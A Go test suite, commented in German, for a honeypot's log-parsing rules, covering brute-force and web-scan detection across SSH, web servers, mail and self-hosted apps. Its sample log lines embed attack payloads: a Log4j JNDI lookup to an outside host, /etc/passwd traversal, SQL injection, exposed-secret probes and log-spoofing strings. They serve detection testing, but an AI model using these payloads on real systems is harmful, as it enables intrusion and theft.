package honeypot

import (
	"net/netip"
	"sort"
	"strings"
	"testing"
	"time"
)

// svcRuleIDs sind die Regeln dieser Datei (logrules_fw.go meldet weitere an; die Tests hier sehen nur diese).
func svcRules(t *testing.T) map[string]*LogRule {
	t.Helper()
	out := map[string]*LogRule{}
	for _, r := range LogRules() {
		out[r.ID] = r
	}
	for _, id := range []string{"sshd/bruteforce", "nginx/exploit", "nginx/exploit-sqli", "nginx/scan", "nginx/bruteforce",
		"nginx/bad-useragent", "apache/exploit", "caddy/exploit", "postfix/sasl-bruteforce", "dovecot/imap-bruteforce",
		"dovecot/pop3-bruteforce", "proxmox/bruteforce", "nextcloud/bruteforce", "vaultwarden/bruteforce",
		"gitea/bruteforce", "homeassistant/bruteforce"} {
		if out[id] == nil {
			t.Fatalf("rule %s not registered", id)
		}
	}
	return out
}

func TestLogRulesWellFormed(t *testing.T) {
	seen := map[string]bool{}
	for _, r := range LogRules() {
		if seen[r.ID] {
			t.Errorf("duplicate rule %s", r.ID)
		}
		seen[r.ID] = true
		if r.Version < 1 || r.Threshold < 1 || r.Window <= 0 || r.Kind == "" || r.Service == "" || r.Match == nil ||
			!strings.Contains(r.ID, "/") {
			t.Errorf("rule %s incomplete: %+v", r.ID, r)
		}
	}
	svcRules(t)
	if got := (&LogRule{ID: "sshd/bruteforce", Version: 1}).Tag(); got != "sshd/bruteforce@1" {
		t.Errorf("tag %q", got)
	}
}

// svcHit ist das erwartete Ergebnis einer Regel.
type svcHit struct {
	src     string
	success bool
	weight  int
	port    int
}

// svcMatches wendet alle Regeln dieser Datei auf l an (wie die Engine) und liefert die Treffer je Regel.
func svcMatches(t *testing.T, l LogLine) map[string]LogHit {
	t.Helper()
	out := map[string]LogHit{}
	for _, r := range LogRules() {
		if !logOriginOK(r, l.Origin) {
			continue
		}
		if h, ok := r.Match(&l); ok {
			out[r.ID] = h
		}
	}
	return out
}

func svcLine(format, s string) LogLine {
	return logFileLine(format, "/host/log/test", s, time.Date(2026, 10, 20, 12, 0, 0, 0, time.UTC))
}

func TestLogRulesSamples(t *testing.T) {
	svcRules(t)
	cases := []struct {
		name, format, line string
		want               map[string]svcHit // nur Regeln dieser Datei; leer = keine Regel darf treffen
	}{
		// sshd
		{"ssh failed", "syslog", "Oct 20 12:00:01 host sshd[123]: Failed password for root from 203.0.113.5 port 51234 ssh2",
			map[string]svcHit{"sshd/bruteforce": {src: "203.0.113.5"}}},
		{"ssh failed invalid", "syslog", "2026-10-20T12:00:01.123456+02:00 host sshd[123]: Failed password for invalid user admin from 2001:db8::5 port 51234 ssh2",
			map[string]svcHit{"sshd/bruteforce": {src: "2001:db8::5"}}},
		{"ssh invalid user", "syslog", "Oct 20 12:00:01 host sshd[123]: Invalid user oracle from 203.0.113.5 port 40000",
			map[string]svcHit{"sshd/bruteforce": {src: "203.0.113.5"}}},
		{"ssh session binary", "syslog", "Oct 20 12:00:01 host sshd-session[99]: Failed keyboard-interactive/pam for root from 203.0.113.5 port 1 ssh2",
			map[string]svcHit{"sshd/bruteforce": {src: "203.0.113.5"}}},
		{"ssh max attempts", "syslog", "Oct 20 12:00:01 host sshd[123]: error: maximum authentication attempts exceeded for root from 203.0.113.5 port 4 ssh2 [preauth]",
			map[string]svcHit{"sshd/bruteforce": {src: "203.0.113.5"}}},
		{"ssh max attempts spoof", "syslog", "Oct 20 12:00:01 host sshd[123]: Received disconnect from 203.0.113.5 port 4:11: maximum authentication attempts exceeded for root from 198.51.100.1 port 22 ssh2 [preauth]", nil},
		{"ssh disconnected authenticating", "syslog", "Oct 20 12:00:01 host sshd[123]: Disconnected from authenticating user root 203.0.113.5 port 4 [preauth]",
			map[string]svcHit{"sshd/bruteforce": {src: "203.0.113.5"}}},
		{"ssh closed invalid", "syslog", "Oct 20 12:00:01 host sshd[123]: Connection closed by invalid user test 203.0.113.5 port 4 [preauth]",
			map[string]svcHit{"sshd/bruteforce": {src: "203.0.113.5"}}},
		{"ssh accepted", "syslog", "Oct 20 12:00:01 host sshd[123]: Accepted publickey for dennis from 192.168.1.10 port 5 ssh2: ED25519 SHA256:abc",
			map[string]svcHit{"sshd/bruteforce": {src: "192.168.1.10", success: true}}},
		{"ssh spoofed user", "syslog", "Oct 20 12:00:01 host sshd[123]: Invalid user a from 198.51.100.9 from 203.0.113.5 port 40000",
			map[string]svcHit{"sshd/bruteforce": {src: "203.0.113.5"}}},
		{"ssh spoofed preauth", "syslog", "Oct 20 12:00:01 host sshd[123]: Connection closed by invalid user x 198.51.100.9 port 1 203.0.113.5 port 4 [preauth]",
			map[string]svcHit{"sshd/bruteforce": {src: "203.0.113.5"}}},
		{"ssh pam duplicate", "syslog", "Oct 20 12:00:01 host sshd[123]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.5  user=root", nil},
		{"ssh closed normal", "syslog", "Oct 20 12:00:01 host sshd[123]: Connection closed by 203.0.113.5 port 4", nil},
		{"ssh other program", "syslog", "Oct 20 12:00:01 host sudo: Failed password for root from 203.0.113.5 port 1 ssh2", nil},

		// nginx / apache / caddy
		{"web env", "nginx", `203.0.113.7 - - [20/Oct/2026:12:00:01 +0200] "GET /.env HTTP/1.1" 404 153 "-" "Mozilla/5.0"`,
			map[string]svcHit{"nginx/exploit": {src: "203.0.113.7", weight: 3}, "nginx/scan": {src: "203.0.113.7"}}},
		{"web plugin ok", "nginx", `203.0.113.7 - - [20/Oct/2026:12:00:01 +0200] "GET /wp-content/plugins/x/style.css HTTP/1.1" 200 15 "-" "Mozilla/5.0"`, nil},
		{"web plugin missing", "nginx", `203.0.113.7 - - [20/Oct/2026:12:00:01 +0200] "GET /wp-content/plugins/revslider/x.php HTTP/1.1" 404 15 "-" "Mozilla/5.0"`,
			map[string]svcHit{"nginx/exploit": {src: "203.0.113.7"}, "nginx/scan": {src: "203.0.113.7"}}},
		{"web traversal", "nginx", `203.0.113.7 - - [20/Oct/2026:12:00:01 +0200] "GET /cgi-bin/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 0 "-" "-"`,
			map[string]svcHit{"nginx/exploit-traversal": {src: "203.0.113.7"}}},
		{"web jndi ua", "nginx", `203.0.113.7 - - [20/Oct/2026:12:00:01 +0200] "GET / HTTP/1.1" 200 10 "-" "${jndi:ldap://198.51.100.1/a}"`,
			map[string]svcHit{"nginx/exploit-jndi": {src: "203.0.113.7"}}},
		{"web sqli", "nginx", `203.0.113.7 - - [20/Oct/2026:12:00:01 +0200] "GET /item.php?id=1%20UNION%20SELECT%20password%20FROM%20users HTTP/1.1" 200 10 "-" "Mozilla/5.0"`,
			map[string]svcHit{"nginx/exploit-sqli": {src: "203.0.113.7"}}},
		{"web bad ua", "nginx", `203.0.113.7 - - [20/Oct/2026:12:00:01 +0200] "GET / HTTP/1.1" 200 10 "-" "Mozilla/5.0 zgrab/0.x"`,
			map[string]svcHit{"nginx/bad-useragent": {src: "203.0.113.7"}}},
		{"web wp-login fail", "nginx", `203.0.113.7 - - [20/Oct/2026:12:00:01 +0200] "POST /wp-login.php HTTP/1.1" 200 4500 "-" "Mozilla/5.0"`,
			map[string]svcHit{"nginx/bruteforce": {src: "203.0.113.7"}}},
		{"web wp-login ok", "nginx", `198.51.100.20 - - [20/Oct/2026:12:00:01 +0200] "POST /wp-login.php HTTP/2.0" 302 0 "-" "Mozilla/5.0"`,
			map[string]svcHit{"nginx/bruteforce": {src: "198.51.100.20", success: true}}},
		{"web normal", "nginx", `198.51.100.20 - - [20/Oct/2026:12:00:01 +0200] "GET /index.html?q=hallo+welt HTTP/1.1" 200 512 "https://example.org/" "Mozilla/5.0"`, nil},
		{"web quoted", "nginx", `198.51.100.20 - - [20/Oct/2026:12:00:01 +0200] "GET /a\"b HTTP/1.1" 404 0 "-" "x"`,
			map[string]svcHit{"nginx/scan": {src: "198.51.100.20"}}},
		{"web garbage", "nginx", `not a log line`, nil},
		{"apache combined", "apache", `203.0.113.7 - - [20/Oct/2026:12:00:01 +0200] "GET /.git/config HTTP/1.1" 403 199 "-" "curl/8"`,
			map[string]svcHit{"apache/exploit": {src: "203.0.113.7", weight: 3}}},
		{"caddy tls", "caddy", `{"level":"info","ts":1792490401.1,"logger":"http.log.access","msg":"handled request","request":{"remote_ip":"10.0.0.2","remote_port":"5555","client_ip":"203.0.113.8","proto":"HTTP/2.0","method":"GET","host":"x.example","uri":"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","headers":{"User-Agent":["Mozilla/5.0"]},"tls":{"resumed":false}},"status":404}`,
			map[string]svcHit{"caddy/exploit": {src: "203.0.113.8", weight: 3, port: 443}, "caddy/scan": {src: "203.0.113.8", port: 443}}},
		{"caddy plain", "caddy", `{"level":"info","msg":"handled request","request":{"remote_ip":"203.0.113.8","method":"GET","uri":"/","headers":{"User-Agent":["sqlmap/1.7"]}},"status":200}`,
			map[string]svcHit{"caddy/bad-useragent": {src: "203.0.113.8"}}},

		// Mail
		{"postfix sasl", "syslog", "Oct 20 12:00:01 mx postfix/smtpd[555]: warning: unknown[203.0.113.9]: SASL LOGIN authentication failed: UGFzc3dvcmQ6",
			map[string]svcHit{"postfix/sasl-bruteforce": {src: "203.0.113.9"}}},
		{"postfix submission", "syslog", "Oct 20 12:00:01 mx postfix/submission/smtpd[555]: warning: host.example[2001:db8::9]: SASL PLAIN authentication failed: ",
			map[string]svcHit{"postfix/sasl-bruteforce": {src: "2001:db8::9", port: 587}}},
		{"postfix ok", "syslog", "Oct 20 12:00:01 mx postfix/submission/smtpd[555]: 4ABCD: client=pc.example[198.51.100.3], sasl_method=PLAIN, sasl_username=dennis",
			map[string]svcHit{"postfix/sasl-bruteforce": {src: "198.51.100.3", success: true, port: 587}}},
		{"postfix other", "syslog", "Oct 20 12:00:01 mx postfix/smtpd[555]: connect from unknown[203.0.113.9]", nil},
		{"postfix helo spoof", "syslog", "Oct 20 12:00:01 mx postfix/smtpd[555]: NOQUEUE: reject: RCPT from unknown[203.0.113.9]: 554 5.7.1 <a@b>: Relay access denied; from=<x> to=<a@b> proto=ESMTP helo=<x[198.51.100.1]: SASL LOGIN authentication failed>", nil},
		{"postfix sender spoof", "syslog", "Oct 20 12:00:01 mx postfix/smtpd[555]: 4ABCD: reject: RCPT from unknown[203.0.113.9]: 554; from=<client=x[198.51.100.1], sasl_method=PLAIN>", nil},
		{"postfix sasl spoof host", "syslog", "Oct 20 12:00:01 mx postfix/smtpd[555]: warning: unknown[203.0.113.9]: SASL LOGIN authentication failed: x[198.51.100.1]: SASL",
			map[string]svcHit{"postfix/sasl-bruteforce": {src: "203.0.113.9"}}},
		{"dovecot imap", "syslog", "Oct 20 12:00:01 mx dovecot: imap-login: Disconnected (auth failed, 3 attempts in 15 secs): user=<info>, method=PLAIN, rip=203.0.113.10, lip=10.0.0.1, TLS, session=<abc>",
			map[string]svcHit{"dovecot/imap-bruteforce": {src: "203.0.113.10", weight: 3}}},
		{"dovecot pop3 new", "syslog", "Oct 20 12:00:01 mx dovecot: pop3-login: Login aborted: Connection closed (auth failed, 1 attempts in 2 secs) (auth_failed): user=<a>, method=PLAIN, rip=203.0.113.10, lip=10.0.0.1",
			map[string]svcHit{"dovecot/pop3-bruteforce": {src: "203.0.113.10", weight: 1}}},
		{"dovecot spoof", "syslog", "Oct 20 12:00:01 mx dovecot: imap-login: Disconnected (auth failed, 1 attempts in 2 secs): user=<x rip=198.51.100.1,>, method=PLAIN, rip=203.0.113.10, lip=10.0.0.1",
			map[string]svcHit{"dovecot/imap-bruteforce": {src: "203.0.113.10", weight: 1}}},
		{"dovecot login", "syslog", "Oct 20 12:00:01 mx dovecot: imap-login: Login: user=<dennis>, method=PLAIN, rip=198.51.100.3, lip=10.0.0.1, mpid=1, TLS",
			map[string]svcHit{"dovecot/imap-bruteforce": {src: "198.51.100.3", success: true}}},

		// Anwendungen
		{"proxmox", "proxmox", "Oct 20 12:00:01 pve pvedaemon[1234]: authentication failure; rhost=::ffff:203.0.113.11 user=root@pam msg=Authentication failure",
			map[string]svcHit{"proxmox/bruteforce": {src: "203.0.113.11"}}},
		{"proxmox ok", "syslog", "Oct 20 12:00:01 pve pvedaemon[1234]: <root@pam> successful auth for user 'root@pam'", nil},
		{"nextcloud", "nextcloud", `{"reqId":"abc","level":2,"time":"2026-10-20T12:00:01+00:00","remoteAddr":"203.0.113.12","user":"--","app":"core","method":"POST","url":"/login","message":"Login failed: 'admin' (Remote IP: '203.0.113.12')","userAgent":"Mozilla/5.0","version":"29.0.0.1"}`,
			map[string]svcHit{"nextcloud/bruteforce": {src: "203.0.113.12"}}},
		{"nextcloud other", "nextcloud", `{"reqId":"abc","level":1,"remoteAddr":"203.0.113.12","app":"core","url":"/Login failed","message":"Something else"}`, nil},
		{"vaultwarden", "vaultwarden", "[2026-10-20 12:00:01.123][vaultwarden::api::identity][ERROR] Username or password is incorrect. Try again. IP: 203.0.113.13. Username: a@b.c.",
			map[string]svcHit{"vaultwarden/bruteforce": {src: "203.0.113.13"}}},
		{"vaultwarden admin", "vaultwarden", "[2026-10-20 12:00:01.123][vaultwarden::api::admin][ERROR] Invalid admin token. IP: 2001:db8::13",
			map[string]svcHit{"vaultwarden/bruteforce": {src: "2001:db8::13"}}},
		{"gitea", "gitea", "2026/10/20 12:00:01 ...ers/web/auth/auth.go:231:SignInPost() [I] Failed authentication attempt for admin from 203.0.113.14:56789: user does not exist [uid: 0, name: admin]",
			map[string]svcHit{"gitea/bruteforce": {src: "203.0.113.14"}}},
		{"gitea v6", "gitea", "2026/10/20 12:00:01 ...ers/web/auth/auth.go:231:SignInPost() [I] Failed authentication attempt for dennis from [2001:db8::14]:56789: user's password is invalid [uid: 1, name: dennis]",
			map[string]svcHit{"gitea/bruteforce": {src: "2001:db8::14"}}},
		{"gitea spoof", "gitea", "2026/10/20 12:00:01 auth.go:231:SignInPost() [I] Failed authentication attempt for x from 198.51.100.1:1: y from 203.0.113.14:56789: user does not exist [uid: 0, name: x from 198.51.100.1:1: y]",
			map[string]svcHit{"gitea/bruteforce": {src: "203.0.113.14"}}},
		{"homeassistant", "homeassistant", "2026-10-20 12:00:01.123 WARNING (MainThread) [homeassistant.components.http.ban] Login attempt or request with invalid authentication from pc.fritz.box (192.168.178.20). Requested URL: '/auth/token'. (Mozilla/5.0)",
			map[string]svcHit{"homeassistant/bruteforce": {src: "192.168.178.20"}}},
		{"homeassistant old", "homeassistant", "2026-10-20 12:00:01 WARNING (MainThread) [homeassistant.components.http.ban] Login attempt or request with invalid authentication from 203.0.113.15",
			map[string]svcHit{"homeassistant/bruteforce": {src: "203.0.113.15"}}},
	}
	mine := svcRules(t)
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := svcMatches(t, svcLine(c.format, c.line))
			var gotIDs, wantIDs []string
			for id := range got {
				if mine[id] != nil && !logFwRule(id) {
					gotIDs = append(gotIDs, id)
				}
			}
			for id := range c.want {
				wantIDs = append(wantIDs, id)
			}
			sort.Strings(gotIDs)
			sort.Strings(wantIDs)
			if strings.Join(gotIDs, ",") != strings.Join(wantIDs, ",") {
				t.Fatalf("rules %v, want %v", gotIDs, wantIDs)
			}
			for id, w := range c.want {
				h := got[id]
				if h.Src != netip.MustParseAddr(w.src) || h.Success != w.success || h.Weight != w.weight || h.Port != w.port {
					t.Errorf("%s: hit %+v, want %+v", id, h, w)
				}
			}
		})
	}
}

// logFwRule meldet Regeln aus logrules_fw.go (anderer Teil), die hier nicht geprueft werden.
func logFwRule(id string) bool {
	for _, p := range []string{"sshd/", "nginx/", "apache/", "caddy/", "postfix/", "dovecot/", "proxmox/", "nextcloud/",
		"vaultwarden/", "gitea/", "homeassistant/"} {
		if strings.HasPrefix(id, p) {
			return false
		}
	}
	return true
}

func TestLogRulesSyslogOrigin(t *testing.T) {
	// per Syslog empfangene Zeilen tragen Programm und Nachricht schon zerlegt
	l := LogLine{Time: time.Now(), Origin: SrcSyslog, Format: "syslog", Program: "sshd", Message: "Failed password for root from 203.0.113.5 port 1 ssh2"}
	if _, ok := svcMatches(t, l)["sshd/bruteforce"]; !ok {
		t.Fatal("sshd rule must work for syslog lines")
	}
}

func TestLogWebClassifyKinds(t *testing.T) {
	// jede OWASP-Kategorie hat ihre eigene Regel mit der Art der Koeder
	for _, o := range sensorOWASP {
		r := svcRules(t)["nginx/exploit-"+o.tag]
		if r == nil || r.Kind != o.kind {
			t.Errorf("nginx/exploit-%s missing or wrong kind", o.tag)
		}
	}
}
